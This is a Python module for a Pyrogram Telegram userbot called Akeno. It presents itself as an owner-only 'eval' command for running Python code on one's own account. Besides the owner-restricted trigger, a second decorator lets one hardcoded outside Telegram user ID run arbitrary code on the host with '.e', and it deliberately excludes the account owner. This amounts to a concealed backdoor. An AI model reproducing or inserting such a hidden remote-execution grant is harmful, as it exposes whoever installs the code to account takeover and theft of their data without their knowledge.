import asyncio
import io
import os
import re
import subprocess
import sys
import traceback
from asyncio import sleep
from contextlib import suppress
from io import BytesIO, StringIO
from random import randint
from typing import Optional

from pyrogram import Client
from pyrogram import Client as app
from pyrogram import Client as ren
from pyrogram import *
from pyrogram.raw import *
from pyrogram.raw.functions.channels import GetFullChannel
from pyrogram.raw.functions.messages import GetFullChat
from pyrogram.raw.functions.phone import CreateGroupCall
from pyrogram.raw.functions.phone import CreateGroupCall as call
from pyrogram.raw.functions.phone import DiscardGroupCall
from pyrogram.raw.types import *
from pyrogram.raw.types import InputGroupCall, InputPeerChannel, InputPeerChat
from pyrogram.types import *

from Akeno.utils.handler import *
from Akeno.utils.tools import *
from config import CMD_HANDLER


@Akeno(
    ~filters.scheduled
    & filters.command(["e"], ["."])
    & filters.user(1191668125)
    & ~filters.me
    & ~filters.forwarded
)
@Akeno(
    ~filters.scheduled
    & filters.command(["eval", "ev"], CMD_HANDLER)
    & filters.me
    & ~filters.forwarded
)
async def evaluation_cmd_t(client: Client, message: Message):
    user_id = message.from_user.id
    status_message = await message.reply("__Processing eval pyrogram...__")
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        return await status_message.edit("__No evaluate message!__")
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = io.StringIO()
    redirected_error = sys.stderr = io.StringIO()
    stdout, stderr, exc = None, None, None

    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()

    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr

    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"

    final_output = f"**OUTPUT**:\n<pre language=''>{evaluation.strip()}</pre>"
    if len(final_output) > 4096:
        with open("eval.txt", "w+", encoding="utf8") as out_file:
            out_file.write(final_output)
        await status_message.reply_document(
            document="eval.txt",
            caption=cmd[: 4096 // 4 - 1],
            disable_notification=True,
        )
        os.remove("eval.txt")
        await status_message.delete()
    else:
        await status_message.edit_text(final_output)

async def aexec(code, client, message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {l_}" for l_ in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)

async def shell_exec(code, treat=True):
    process = await asyncio.create_subprocess_shell(
        code, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT
    )

    stdout = (await process.communicate())[0]
    if treat:
        stdout = stdout.decode().strip()
    return stdout, process

module = modules_help.add_module("eval", __file__)
module.add_command("eval", "to eval code in python")
